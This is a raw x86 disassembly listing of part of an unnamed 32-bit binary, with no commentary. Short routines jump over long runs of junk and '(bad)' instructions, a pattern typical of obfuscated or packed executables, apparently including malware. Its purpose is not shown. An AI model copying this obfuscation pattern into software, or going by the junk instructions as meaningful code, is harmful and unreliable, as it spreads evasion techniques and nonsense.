  405474:	add    eax,edx
  405476:	pop    esi
  405477:	leave  
  405478:	ret    0x18
  40547b:	push   ebp
  40547c:	mov    ebp,esp
  40547e:	mov    eax,DWORD PTR [ebp+0xc]
  405481:	xor    edx,edx
  405483:	mov    ecx,0x7264fcad
  405488:	jmp    0x40559b
  40548d:	enter  0x8006,0xb
  405491:	inc    edx
  405492:	lea    ebx,[ebx-0x27]
  405495:	mov    dl,0x23
  405497:	sub    dh,BYTE PTR [eax]
  405499:	or     edx,edi
  40549b:	ins    BYTE PTR es:[edi],dx
  40549c:	jmp    0x4054c8
  40549e:	sub    edi,DWORD PTR [esp+edi*2+0x62]
  4054a2:	jl     0x405520
  4054a4:	jl     0x405486
  4054a6:	pop    ebp
  4054a7:	or     bl,BYTE PTR [eax-0x333c7091]
  4054ad:	mov    esp,0x785704cb
  4054b2:	test   dl,bl
  4054b4:	dec    eax
  4054b5:	repz mov ds:0xc2fb64d2,al
  4054bb:	mov    ebx,0xa11ea7a2
  4054c0:	mov    cl,0x7b
  4054c2:	pop    ds
  4054c3:	pop    ds
  4054c4:	mov    ds:0x9d77e1d6,eax
  4054c9:	stos   BYTE PTR es:[edi],al
  4054ca:	addr16 add eax,0xfe5071c6
  4054d0:	xchg   BYTE PTR [edx],bl
  4054d2:	push   ebx
  4054d3:	xchg   ebx,eax
  4054d4:	cmp    eax,esi
  4054d6:	adc    eax,0xe6d71d31
  4054db:	xchg   ebx,ecx
  4054dd:	test   BYTE PTR ds:0x7670b80c,ch
  4054e3:	push   0xcdf4bdec
  4054e8:	jl     0x4054f8
  4054ea:	stc    
  4054eb:	mov    dh,BYTE PTR [esi-0x14996749]
  4054f1:	mov    DWORD PTR [edx+ecx*1],edx
  4054f4:	das    
  4054f5:	pop    eax
  4054f6:	adc    BYTE PTR [ebp-0x3a],ah
  4054f9:	rep ins BYTE PTR es:[edi],dx
  4054fb:	inc    edi
  4054fc:	lock xchg esi,eax
  4054fe:	push   ebx
  4054ff:	mov    edx,0x8bb9a291
  405504:	and    ah,bh
  405506:	or     al,0xa9
  405508:	sahf   
  405509:	(bad)  [edx+ebx*8-0x1e]
  40550d:	rol    DWORD PTR [eax+0xac0431c],1
  405513:	cdq    
  405514:	xchg   esp,edx
  405516:	jo     0x405569
  405518:	fld    DWORD PTR [esi]
  40551a:	int3   
  40551b:	jp     0x4054f8
  40551d:	leave  
  40551e:	or     bl,ch
  405520:	call   0xe4641d79
  405525:	cdq    
  405526:	push   ebx
  405527:	add    BYTE PTR [edx+0x6e8501d6],cl
  40552d:	ss iret 
  40552f:	push   ebp
  405530:	sbb    ebp,edx
  405532:	popa   
  405533:	lea    esi,[esi-0x27]
  405536:	xchg   ecx,eax
  405537:	add    al,0x47
  405539:	sbb    al,0xb6
  40553b:	cmp    esi,DWORD PTR [ecx+0x511225d3]
  405541:	repnz mov esp,0x75e34548
  405547:	mov    DWORD PTR [esi],ecx
  405549:	shld   ebp,ebx,0x2c
  40554d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40554e:	pop    es
  40554f:	xchg   ebp,eax
  405550:	in     al,0xbc
  405552:	or     eax,0xfd9fca3f
  405557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405558:	push   ds
  405559:	clc    
  40555a:	ror    bl,0xaf
  40555d:	mov    cl,0xb6
  40555f:	jbe    0x405506
  405561:	arpl   WORD PTR [esi+0x58],dx
  405564:	dec    ebp
  405565:	mov    cl,0x8d
  405567:	sahf   
  405568:	pop    ecx
  405569:	sub    al,0xa3
  40556b:	js     0x40556b
  40556d:	mov    dl,0x73
  40556f:	add    eax,0x250eabbf
  405574:	pop    edx
  405575:	aam    0xa9
  405577:	repz aaa 
  405579:	xor    al,0x68
  40557b:	mov    DWORD PTR ds:0xd7dd51a4,0x6cddf55b
  405585:	cwde   
  405586:	dec    edx
  405587:	jbe    0x40550d
  405589:	ret    0x1745
  40558c:	hlt    
  40558d:	cmp    al,0x48
  40558f:	scas   eax,DWORD PTR es:[edi]
  405590:	dec    eax
  405591:	ss test eax,0x65eb7ee4
  405597:	push   esi
  405598:	or     bh,BYTE PTR [edi]
  40559a:	mov    ecx,0x4d8bf1f7
  40559f:	adc    BYTE PTR [ebx],ah
  4055a1:	enter  0xc981,0x8f
  4055a5:	sbb    eax,0xc18b8116
  4055aa:	pop    ebp
  4055ab:	ret    0x18
  4055ae:	push   ebp
  4055af:	mov    ebp,esp
  4055b1:	push   ecx
  4055b2:	xor    edx,edx
  4055b4:	xor    edx,DWORD PTR ds:0x4454d4
  4055ba:	xor    ecx,ecx
  4055bc:	or     ecx,DWORD PTR ds:0x44b700
  4055c2:	sub    edx,ecx
  4055c4:	sub    edx,DWORD PTR [edx+ecx*1]
  4055c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4055ce:	movzx  eax,WORD PTR ds:0x44e424
  4055d5:	adc    DWORD PTR ds:0x4247be,eax
  4055db:	jmp    0x405714
  4055e0:	ins    DWORD PTR es:[edi],dx
  4055e1:	je     0x40559f
  4055e3:	xchg   DWORD PTR [ebp+0x47],edx
  4055e6:	jge    0x4055e2
  4055e8:	fs pop ebp
  4055ea:	mov    eax,0x48983677
  4055ef:	push   ds
  4055f0:	adc    BYTE PTR [edx],ch
  4055f2:	jl     0x405670
  4055f4:	sbb    BYTE PTR [edi+0x7c],bh
  4055f7:	jl     0x4055d8
  4055f9:	out    dx,al
  4055fa:	leave  
  4055fb:	or     DWORD PTR [ebx-0x28],ebp
  4055fe:	inc    DWORD PTR [esi]
  405600:	add    al,0xa3
  405602:	pop    esi
  405603:	xchg   ebp,eax
  405604:	pop    esp
  405605:	push   ds
  405606:	cwde   
  405607:	pop    eax
  405608:	mov    ds:0xd6d2743d,eax
  40560d:	ds test eax,0x3c65fb8e
  405613:	ss mov edx,0xb6ebd431
  405619:	or     dl,al
  40561b:	popf   
  40561c:	pop    ss
  40561d:	loop   0x405696
  40561f:	mov    edi,0xe0a7aa10
  405624:	sbb    BYTE PTR [ebx],cl
  405626:	mov    dl,0x18
  405628:	xchg   DWORD PTR [ebx+eax*2+0x30],ebx
  40562c:	std    
  40562d:	ror    DWORD PTR [edx],1
  40562f:	sbb    eax,ecx
  405631:	add    eax,0xac5f0af2
  405636:	mov    dl,0x14
  405638:	imul   ebp,DWORD PTR [ebx-0x15],0xec293f4b
  40563f:	repz cmp eax,0x6
  405643:	xor    cl,bh
  405645:	int    0x3
  405647:	mov    ah,0xbf
  405649:	lods   al,BYTE PTR ds:[esi]
  40564a:	mov    al,0x5b
  40564c:	ds jg  0x405682
  40564f:	push   0x2be4e08c
  405654:	(bad)  
  405655:	int    0xa6
  405657:	mov    dl,0xc
  405659:	pop    edx
  40565a:	jae    0x40567d
  40565c:	mov    fs,WORD PTR [esi]
  40565e:	mov    esi,DWORD PTR [ebp+0x2a]
  405661:	pop    esp
  405662:	pop    ebx
  405663:	xor    eax,0xda79d20b
  405668:	ja     0x405644
  40566a:	popa   
  40566b:	stos   BYTE PTR es:[edi],al
  40566c:	inc    eax
  40566d:	mov    ah,0xc1
  40566f:	je     0x4056a1
  405671:	add    eax,0x41e6eb2d
  405676:	inc    ebp
  405677:	shl    DWORD PTR ds:0x468bdbe8,0x70
  40567e:	test   al,0xd8
  405680:	test   cl,ch
  405682:	mov    esp,0x34f555b9
  405687:	jno    0x4056fa
  405689:	jmp    0x43d333f0
  40568e:	push   0xfffffff4
  405690:	jae    0x40564a
  405692:	jmp    0x4801a257
  405697:	pop    es
  405698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405699:	popf   
  40569a:	mov    ah,0x45
  40569c:	clc    
  40569d:	mov    edx,0x74bf50b4
  4056a2:	jg     0x405646
  4056a4:	add    DWORD PTR [edx+eax*1],esi
  4056a7:	test   BYTE PTR [eax+0x62],dl
  4056aa:	shl    DWORD PTR [ebx-0x53e493de],cl
  4056b0:	int    0x8b
  4056b2:	shl    BYTE PTR [eax],1
  4056b4:	into   
  4056b5:	pop    ecx
  4056b6:	sar    BYTE PTR [ebx],cl
  4056b8:	jl     0x405718
  4056ba:	addr16 pushf 
  4056bc:	cmp    al,0x8e
  4056be:	lods   al,BYTE PTR gs:[esi]
  4056c0:	pop    eax
  4056c1:	or     ebp,DWORD PTR [esi-0x3d97262e]
  4056c7:	mov    DWORD PTR [edx],eax
  4056c9:	lahf   
  4056ca:	ds (bad) 
  4056cc:	push   ss
  4056cd:	inc    eax
  4056ce:	mov    dl,0x41
  4056d0:	daa    
  4056d1:	div    DWORD PTR [ecx]
  4056d3:	ret    
  4056d4:	call   0x36926fad
  4056d9:	mov    ebx,0xd15ed7a8
  4056de:	(bad)  
  4056df:	push   edi
  4056e0:	fstp   QWORD PTR [esi]
  4056e2:	bound  edi,QWORD PTR [esi-0x9]
  4056e5:	dec    edi
  4056e6:	pop    ebp
  4056e7:	cmpxchg DWORD PTR [eax-0x32e6a702],ecx
  4056ee:	sbb    dh,cl
  4056f0:	into   
  4056f1:	sub    ah,BYTE PTR [edx+0x36]
  4056f4:	mov    ecx,0x1795f32b
  4056f9:	sub    ch,BYTE PTR [eax]
  4056fb:	dec    DWORD PTR [ecx-0x56]
  4056fe:	push   es
  4056ff:	xsavec [ecx+0x6b]
  405703:	aaa    
  405704:	adc    BYTE PTR [eax+0x35],ah
  405707:	jbe    0x40569a
  405709:	cwde   
  40570a:	retf   
  40570b:	mov    esi,0x319e535c
  405710:	in     eax,0xf0
  405712:	push   ecx
  405713:	mov    edi,0x8bfc458b
  405718:	push   ebp
  405719:	adc    BYTE PTR [ecx+0x2821c9],al
  40571f:	add    BYTE PTR [ecx+0x7510857],bh
  405725:	not    DWORD PTR ds:0x4247da
  40572b:	jmp    0x405864
  405730:	xor    al,dh
  405732:	push   0x65
  405734:	jp     0x40579b
  405736:	fnstsw WORD PTR [ecx-0x7c]
  405739:	mov    ebp,0x7be00b79
  40573e:	or     dl,al
  405740:	cmp    al,0x2d
  405742:	jl     0x4057c0
  405744:	sbb    BYTE PTR [edi+0x7c],bh
  405747:	jl     0x405789
  405749:	in     eax,dx
  40574a:	dec    edi
  40574b:	mov    dl,bh
  40574d:	scas   al,BYTE PTR es:[edi]
  40574e:	jl     0x4057a5
  405750:	jge    0x405750
  405752:	add    BYTE PTR [eax-0x1b556769],ch
  405758:	ins    DWORD PTR es:[edi],dx
  405759:	out    0x9c,al
  40575b:	xchg   ebx,eax
  40575c:	stos   DWORD PTR es:[edi],eax
  40575d:	stc    
  40575e:	and    al,0xd9
  405760:	pop    edi
  405761:	idiv   bh
  405763:	(bad)  [edi]
  405765:	repz repz adc dl,bh
  405769:	dec    esi
  40576a:	cdq    
  40576b:	pop    eax
  40576c:	add    eax,0xed2be846
  405771:	into   
  405772:	xchg   ecx,eax
  405773:	arpl   WORD PTR gs:[esp+eiz*8],cx
  405777:	cmp    ebx,DWORD PTR [esi+0x507a61d2]
  40577d:	push   eax
  40577e:	popa   
  40577f:	mov    eax,DWORD PTR [eax]
  405781:	jno    0x405751
  405783:	mov    ebp,0xa7d566c
  405788:	int    0x36
  40578a:	cmp    al,0xd9
  40578c:	mov    dh,0xcb
  40578e:	inc    eax
  40578f:	mov    DWORD PTR [esi+ebx*4+0x4c],ebp
  405793:	push   esp
  405794:	sbb    esi,DWORD PTR [edx+ebx*8-0x55]
  405798:	jge    0x405762
  40579a:	daa    
  40579b:	mov    al,ds:0x21b8ba3b
  4057a0:	lods   eax,DWORD PTR ds:[esi]
  4057a1:	push   esp
  4057a2:	je     0x405738
  4057a4:	sub    al,0x88
  4057a6:	cmp    BYTE PTR ds:0x4e574841,bh
  4057ac:	jl     0x4057b3
  4057ae:	retf   0xdd0f
  4057b1:	jmp    0xc7d2:0xd5d323e5
  4057b8:	mov    ds:0x308f8595,al
  4057bd:	dec    ebx
  4057be:	leave  
  4057bf:	push   edi
  4057c0:	cmp    ebp,DWORD PTR [ecx+0x64]
  4057c3:	and    al,0x6e
  4057c5:	sbb    bh,ah
  4057c7:	inc    edx
  4057c8:	fwait
  4057c9:	mov    ecx,0xdf267fcb
  4057ce:	add    esp,edi
  4057d0:	aas    
  4057d1:	push   ebx
  4057d2:	sbb    DWORD PTR [ebx-0x9],esi
  4057d5:	or     al,0xaf
  4057d7:	shl    eax,1
  4057d9:	add    DWORD PTR [ebp+0x21],eax
  4057dc:	scas   eax,DWORD PTR es:[edi]
  4057dd:	ret    
  4057de:	sub    edx,ebx
  4057e0:	hlt    
  4057e1:	dec    ebx
  4057e2:	add    DWORD PTR [bx-0x49b5],ebp
  4057e7:	xchg   ebx,eax
  4057e8:	std    
  4057e9:	xchg   edi,eax
  4057ea:	mov    esp,0xcb144d54
  4057ef:	dec    edi
  4057f0:	add    eax,0xa440d45e
  4057f5:	lock iret 
  4057f7:	pop    ds
  4057f8:	in     al,dx
  4057f9:	pop    es
  4057fa:	cmp    ecx,DWORD PTR ds:0x4a242d50
  405800:	pop    ecx
  405801:	out    0xf2,eax
  405803:	push   esp
  405804:	add    cl,BYTE PTR [edi]
  405806:	jmp    0xcda003e8
  40580b:	jp     0x4057c3
  40580d:	mov    ecx,0xe1914b73
  405812:	add    eax,edx
  405814:	and    BYTE PTR [esi+ebx*4],0xf7
  405818:	sub    bh,BYTE PTR [ebx-0x277b24a6]
  40581e:	mov    cl,0x15
  405820:	sbb    al,0xc4
  405822:	and    eax,0x90c9657d
  405827:	cmp    DWORD PTR [eax],esi
  405829:	aaa    
  40582a:	or     ebx,DWORD PTR [edx+0x73]
  40582d:	outs   dx,BYTE PTR ds:[esi]
  40582e:	pop    esp
  40582f:	push   esp
  405830:	dec    esp
  405831:	mov    edi,0xfd1c9977
  405836:	in     al,dx
  405837:	mov    ds:0x8f57f1dc,al
  40583c:	sub    esp,DWORD PTR [edi-0x7e872b51]
  405842:	jbe    0x4057d5
  405844:	inc    edi
  405845:	push   eax
  405846:	aaa    
  405847:	inc    ebp
  405848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405849:	gs push ebp
  40584b:	das    
  40584c:	jnp    0x40585e
  40584e:	xchg   edi,eax
  40584f:	pop    esi
  405850:	popf   
  405851:	popf   
  405852:	fwait
  405853:	add    DWORD PTR [ebx],ecx
  405855:	sbb    BYTE PTR [edi-0x310ef4d0],bh
  40585b:	mov    dl,0x47
  40585d:	add    BYTE PTR [edx-0x72],0x8e
  405861:	push   0x68
  405863:	sub    DWORD PTR [ebx],esi
  405865:	rol    DWORD PTR ds:0x32729e,0x81
  40586c:	or     eax,0x4247d2
  405871:	test   BYTE PTR [ecx+0x2890044],cl
  405877:	neg    edx
  405879:	mov    eax,DWORD PTR [ebp+0x14]
  40587c:	and    DWORD PTR ds:0x448994,0x0
  405886:	xor    edx,edx
  405888:	add    edx,DWORD PTR ds:0x448994
  40588e:	inc    edx
  40588f:	mov    DWORD PTR ds:0x448994,edx
  405895:	cmp    DWORD PTR ds:0x448994,0x14
  40589c:	jne    0x4058b0
  4058a2:	push   DWORD PTR [ebp-0x28]
  4058a5:	push   0x4489a4
  4058aa:	call   DWORD PTR ds:0x443360
  4058b0:	cmp    DWORD PTR ds:0x448994,0x13
  4058b7:	jb     0x405886
  4058bd:	mov    edx,DWORD PTR [ebp+0x10]
  4058c0:	mov    DWORD PTR [edx+0x4],eax
  4058c3:	mov    eax,DWORD PTR [ebp+0x18]
  4058c6:	mov    edx,DWORD PTR [ebp+0x10]
  4058c9:	mov    DWORD PTR [edx+0x8],eax
  4058cc:	mov    eax,DWORD PTR [ebp+0x1c]
  4058cf:	mov    edx,DWORD PTR [ebp+0x10]
  4058d2:	jmp    0x405a0b
  4058d7:	in     eax,0xab
  4058d9:	ins    DWORD PTR es:[edi],dx
  4058da:	push   es
  4058db:	jge    0x4058a3
  4058dd:	imul   edi,DWORD PTR gs:[ecx],0x49
  4058e1:	mov    al,ds:0xf884efb9
  4058e6:	ret    
  4058e7:	fsubr  DWORD PTR [esp+edi*2]
  4058ea:	jl     0x405904
  4058ec:	jg     0x40596a
  4058ee:	jl     0x4058af
  4058f0:	push   eax
  4058f1:	loope  0x40593c
  4058f3:	or     al,0x7f
  4058f5:	dec    ebp
  4058f6:	out    0x6a,eax
  4058f8:	ror    bh,1
  4058fa:	jno    0x4058e2
  4058fc:	ds pop esi
  4058fe:	sbb    bl,BYTE PTR [eax-0x4b8081f4]
  405904:	sbb    al,0x1
  405906:	mov    WORD PTR [eax],fs
  405908:	sub    BYTE PTR [eax-0x3d969d80],0xfb
  40590f:	add    DWORD PTR [eax+0x76],ebp
  405912:	sub    al,0xc9
  405914:	sub    BYTE PTR [edx],al
  405916:	fwait
  405917:	(bad)  
  405918:	repnz and al,0xa4
  40591b:	stc    
  40591c:	rcr    BYTE PTR [edi-0x4e],1
  40591f:	test   al,0x1
  405921:	(bad)  
  405922:	sub    ch,dh
  405924:	sar    BYTE PTR [ebp+0x2577c49c],1
  40592a:	xor    bl,BYTE PTR [ebp+0x28cae1c3]
  405930:	mov    ds:0x953c0123,eax
  405935:	(bad)  
  405936:	push   0xf1b38ffd
  40593b:	cmc    
  40593c:	pop    esi
  40593d:	xchg   esp,eax
  40593e:	pop    ebp
  40593f:	xor    edx,DWORD PTR [ecx+edi*2+0x3a]
  405943:	cmp    al,0x91
  405945:	popa   
  405946:	push   0x2d
  405948:	lea    ecx,[edx]
  40594a:	mov    al,0xf5
  40594c:	sar    BYTE PTR [eax+0x3],0xbe
  405950:	repnz daa 
  405952:	jp     0x4058dc
  405954:	scas   al,BYTE PTR es:[edi]
  405955:	repnz das 
  405957:	stos   BYTE PTR es:[edi],al
  405958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405959:	pop    ebx
  40595a:	pop    edx
  40595b:	xor    ecx,DWORD PTR [edi-0x105bd82a]
  405961:	hlt    
  405962:	imul   ebx,DWORD PTR [ebx],0x436122d5
  405968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405969:	sub    DWORD PTR [edx+0x58ddc129],esi
  40596f:	es ins BYTE PTR es:[edi],dx
  405971:	ret    0xcba7
  405974:	outs   dx,BYTE PTR ds:[esi]
  405975:	mul    DWORD PTR [ecx+0x4f]
  405978:	outs   dx,BYTE PTR ds:[esi]
  405979:	jmp    0x70bec935
  40597e:	sti    
  40597f:	mov    bl,0xf7
  405981:	iret   
  405982:	jmp    0x405980
  405984:	aas    
  405985:	push   esi
  405986:	shr    cl,cl
  405988:	imul   esi,DWORD PTR ds:0x5a45f21c,0x93df8957
  405992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405993:	adc    DWORD PTR es:[ecx],0x6fff0064
  40599a:	rcr    ebp,0x7
  40599d:	push   ebx
  40599e:	xchg   esi,eax
  40599f:	mov    es,WORD PTR [edi]
  4059a1:	ins    DWORD PTR es:[edi],dx
  4059a2:	inc    eax
  4059a3:	mov    ds:0x242da1ea,eax
  4059a8:	or     al,0xb7
  4059aa:	xchg   DWORD PTR [esp+eiz*4],esi
  4059ad:	cwde   
  4059ae:	adc    ebx,esp
  4059b0:	dec    esi
  4059b1:	loop   0x4059d5
  4059b3:	pop    ss
  4059b4:	dec    edi
  4059b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059b6:	or     BYTE PTR [ecx-0x7e],dl
  4059b9:	test   DWORD PTR [ebx-0x11f3a978],edx
  4059bf:	pop    eax
  4059c0:	pop    eax
  4059c1:	push   ss
  4059c2:	ret    0x3e0d
  4059c5:	enter  0x5480,0x20
  4059c9:	cld    
  4059ca:	dec    esi
  4059cb:	enter  0x2619,0xbd
  4059cf:	inc    ebp
  4059d0:	ins    DWORD PTR es:[edi],dx
  4059d1:	sub    al,0x58
  4059d3:	repnz pop eax
  4059d5:	sahf   
  4059d6:	popf   
  4059d7:	inc    ecx
  4059d8:	or     bh,bl
  4059da:	inc    ebx
  4059db:	adc    bh,ch
  4059dd:	adc    al,0x33
  4059df:	add    BYTE PTR [ebp+0x27],dh
  4059e2:	rol    esp,0xf3
  4059e5:	inc    edx
  4059e6:	ja     0x40596a
  4059e8:	inc    ebx
  4059e9:	mov    esi,0x14367115
  4059ee:	dec    edx
  4059ef:	push   0xffffffff
  4059f1:	std    
  4059f2:	mov    esp,0xad3520e4
  4059f7:	fs aaa 
  4059f9:	sbb    ebx,DWORD PTR [esi-0xe]
  4059fc:	sub    DWORD PTR [edi+0x39],eax
  4059ff:	test   DWORD PTR [eax],esi
  405a01:	test   BYTE PTR [edx-0x8],bh
  405a04:	xchg   bl,bl
  405a06:	sbb    cl,BYTE PTR [edi-0x76e2d86d]
  405a0c:	inc    edx
  405a0d:	or     al,0x8b
  405a0f:	inc    ebp
  405a10:	and    BYTE PTR [ebx+0x42891055],cl
  405a16:	adc    BYTE PTR [ebx+0x14458bc0],cl
  405a1c:	test   eax,eax
  405a1e:	jmp    0x405b57
  405a23:	pop    edx
  405a24:	loope  0x405a4a
  405a26:	sbb    bh,BYTE PTR [ebx+0x5f617add]
  405a2c:	retf   
  405a2d:	mov    cl,0x6b
  405a2f:	push   es
  405a30:	nop
  405a31:	aad    0xd8
  405a33:	in     al,0x2f
  405a35:	jl     0x405ab3
  405a37:	sbb    BYTE PTR [edi+0x7c],bh
  405a3a:	jl     0x405a4e
  405a3c:	gs cmp al,0x17
  405a3f:	adc    BYTE PTR [edi+0xa],ah
  405a42:	add    edi,DWORD PTR [ebx+0x5c0e430b]
  405a48:	adc    al,0xe1
  405a4a:	icebp  
  405a4b:	(bad)
  405a4e:	(bad)
  405a52:	je     0x405a46
  405a54:	pop    ebp
  405a55:	rol    DWORD PTR [ebx+0x6460cab5],1
  405a5b:	fisub  DWORD PTR [ebx+0x1]
  405a5e:	xor    BYTE PTR [esi],bh
  405a60:	test   eax,0xc441f6a7
  405a65:	mov    dh,0xf0
  405a67:	repz call 0xe02d:0xf8a059aa
  405a6f:	dec    edi
  405a70:	in     eax,0xf1
  405a72:	and    DWORD PTR [ebp+0x51],edx
  405a75:	sahf   
  405a76:	arpl   WORD PTR [ebx+0x0],sp
  405a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a7a:	shl    BYTE PTR [ebx-0x1a],1
  405a7d:	sub    dh,BYTE PTR [ecx-0x56ff4e5]
  405a83:	or     DWORD PTR ds:0x8a502e60,0xffffff9c
  405a8a:	sahf   
  405a8b:	rcr    BYTE PTR [esi],0xa5
  405a8e:	xchg   ebx,eax
  405a8f:	(bad)  
  405a90:	xchg   ebp,eax
  405a91:	or     ebx,ecx
  405a93:	lock in eax,0x87
  405a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a97:	jge    0x405aa4
  405a99:	push   0xffffffe3
  405a9b:	lahf   
  405a9c:	rcl    dh,1
  405a9e:	xchg   esi,eax
  405a9f:	arpl   WORD PTR [ebx],cx
  405aa1:	inc    ebx
  405aa2:	dec    eax
  405aa3:	xor    eax,0x4a7ebd1
  405aa8:	leave  
  405aa9:	lods   al,BYTE PTR ds:[esi]
  405aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405aab:	and    eax,0xd5d01f28
  405ab0:	mov    dl,0x65
  405ab2:	and    ch,ah
  405ab4:	or     DWORD PTR [ebx+edx*8+0x28],ebx
  405ab8:	out    dx,eax
  405ab9:	lea    edi,[eax+edi*2+0x40]
  405abd:	ret    
  405abe:	xchg   ebx,eax
  405abf:	dec    edx
  405ac0:	mov    ebx,0xbcd738
  405ac5:	and    al,0x3b
  405ac7:	lea    ecx,[ecx-0x3f]
  405aca:	pop    ecx
  405acb:	xor    al,0x1a
  405acd:	dec    esp
  405ace:	cld    
  405acf:	fwait
  405ad0:	stc    
  405ad1:	cdq    
  405ad2:	push   edx
  405ad3:	mov    ah,0xd2
  405ad5:	int    0xb
  405ad7:	jbe    0x405a7f
  405ad9:	xchg   BYTE PTR [esp+ebp*1-0x6],dh
  405add:	test   DWORD PTR [eax],0x219adfe0
  405ae3:	adc    BYTE PTR [ebx+0x3d4fc894],cl
  405ae9:	std    
  405aea:	add    eax,0xe4be988c
  405aef:	dec    edx
  405af0:	cmp    cl,cl
  405af2:	loop   0x405a86
  405af4:	cdq    
  405af5:	cs test al,0xd6
  405af9:	jmp    0x59a218aa
  405afe:	cmp    edx,DWORD PTR [eax+0x23]
  405b01:	icebp  
  405b02:	sub    esi,DWORD PTR [edi]
  405b04:	pop    ds
  405b05:	addr16 jo 0x405aab
  405b08:	cli    
  405b09:	pop    ecx
  405b0a:	fist   WORD PTR [ebp+0x72ec0651]
  405b10:	into   
  405b11:	push   edi
  405b12:	mov    esi,0xf09d6a0c
  405b17:	and    BYTE PTR [eax-0x64],ch
  405b1a:	push   0xfffffffb
  405b1c:	adc    DWORD PTR [edx],0xffffff95
  405b1f:	je     0x405ad8
  405b21:	loop   0x405ac4
  405b23:	(bad)  
  405b24:	test   DWORD PTR [ecx],ecx
  405b26:	mov    esi,0x2d740bf1
  405b2b:	and    DWORD PTR [edi-0x1],ebp
  405b2e:	scas   eax,DWORD PTR es:[edi]
  405b2f:	sub    eax,0x5068285
  405b34:	fistp  QWORD PTR [eiz*1+0x3f14e1c6]
  405b3b:	call   0x12ed:0x538247f9
  405b42:	(bad)  
  405b43:	(bad)  
  405b45:	pop    edi
  405b46:	lods   eax,DWORD PTR ds:[esi]
  405b47:	cmp    BYTE PTR [edi+eiz*2],dl
  405b4a:	xor    DWORD PTR [edi],ebp
  405b4c:	and    esi,DWORD PTR [ebp+edx*2+0x1d]
  405b50:	xor    eax,DWORD PTR [edx+ecx*8+0x1a652bda]
  405b57:	mov    eax,DWORD PTR [ebp+0x8]
  405b5a:	jne    0x405b63
  405b60:	mov    eax,DWORD PTR [ebp+0xc]
  405b63:	xor    eax,ecx
  405b65:	add    eax,0x32729e
  405b6a:	leave  
  405b6b:	ret    0x1c
  405b6e:	push   ebp
  405b6f:	mov    ebp,esp
  405b71:	sub    esp,0x78
  405b74:	adc    DWORD PTR ds:0x448988,0x7d94
  405b7e:	jmp    0x405caa
  405b83:	or     esp,ebx
  405b85:	dec    ecx
  405b86:	or     BYTE PTR [ecx-0x53],ch
  405b89:	dec    ebp
  405b8a:	aad    0x48
  405b8c:	aas    
  405b8d:	adc    esi,esp
  405b8f:	xchg   esi,eax
  405b90:	xchg   esp,eax
  405b91:	dec    ecx
  405b92:	xor    DWORD PTR [eax+0xd7c7c2e],eax
  405b98:	jg     0x405c16
  405b9a:	jl     0x405b3a
  405b9c:	aaa    
  405b9d:	and    eax,esi
  405b9f:	sub    ebp,ebx
  405ba1:	sbb    DWORD PTR [eax-0x624cc97c],ecx
  405ba7:	sbb    esi,DWORD PTR [eax]
  405ba9:	adc    eax,0x8ba4f53d
  405bae:	pop    ds
  405baf:	mov    ebp,0xb82cdb7b
  405bb4:	jl     0x405bee
  405bb6:	sub    eax,DWORD PTR [edx]
  405bb8:	push   es
  405bb9:	inc    edi
  405bba:	push   ss
  405bbb:	int    0x7
  405bbd:	adc    al,0xb
  405bbf:	pop    ebx
  405bc0:	or     ebp,ebx
  405bc2:	add    al,0xe5
  405bc4:	cmp    eax,DWORD PTR [edx+0x59]
  405bc7:	out    dx,al
  405bc8:	int3   
  405bc9:	mov    ebp,0xa31b3f6
  405bce:	and    al,0x59
  405bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bd1:	std    
  405bd2:	mov    BYTE PTR [ebx+0x5a296dd5],al
  405bd8:	fadd   QWORD PTR [ebx-0x46]
  405bdb:	inc    esi
  405bdc:	mov    bl,0x38
  405bde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bdf:	scas   eax,DWORD PTR es:[edi]
  405be0:	arpl   WORD PTR [eax-0x4875b3a0],sp
  405be6:	ror    BYTE PTR [eax-0x1],0x2f
  405bea:	adc    al,0x26
  405bec:	cmp    BYTE PTR [eax-0x5a],cl
  405bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bf0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bf2:	cmp    DWORD PTR [esi+0x62],esi
  405bf5:	and    al,0x3d
  405bf7:	icebp  
  405bf8:	pop    edi
  405bf9:	sub    eax,0x54337a83
  405bfe:	sti    
  405bff:	jmp    0xdec2b802
  405c04:	sti    
  405c05:	pop    ecx
  405c06:	pop    edi
  405c07:	cmp    BYTE PTR [eax-0x32],dh
  405c0a:	fidivr DWORD PTR [ebx]
  405c0c:	push   es
  405c0d:	inc    esp
  405c0e:	sbb    ah,BYTE PTR [edi+0x6]
  405c11:	test   eax,0x65fbab9b
  405c16:	sbb    edx,ecx
  405c18:	lea    edi,[edx-0x574d4a0d]
  405c1e:	xchg   esp,eax
  405c1f:	adc    BYTE PTR [eax],al
  405c21:	les    ecx,FWORD PTR [ebp-0x79]
  405c24:	test   BYTE PTR [eax],dl
  405c26:	xor    ebp,DWORD PTR [esi]
  405c28:	sub    ch,bh
  405c2a:	xchg   edi,eax
  405c2b:	cmp    bh,BYTE PTR [ecx-0x19a7d778]
  405c31:	inc    ebp
  405c32:	and    al,0x22
  405c34:	rcr    BYTE PTR [ebx+0xd8e3c38],cl
  405c3a:	jmp    0x405bee
  405c3c:	std    
  405c3d:	mov    esp,0xd2cba2fd
  405c42:	inc    ecx
  405c43:	adc    al,0xe
  405c45:	fstp   QWORD PTR [eax-0x2e801859]
  405c4b:	mov    esi,0x1579eb17
  405c50:	push   esp
  405c51:	out    dx,eax
  405c52:	xor    al,bh
  405c54:	jle    0x405c3a
  405c56:	repnz dec esi
  405c58:	repnz daa 
  405c5a:	or     esp,DWORD PTR [ebx+0x7ba61ac9]
  405c60:	aas    
  405c61:	push   ss
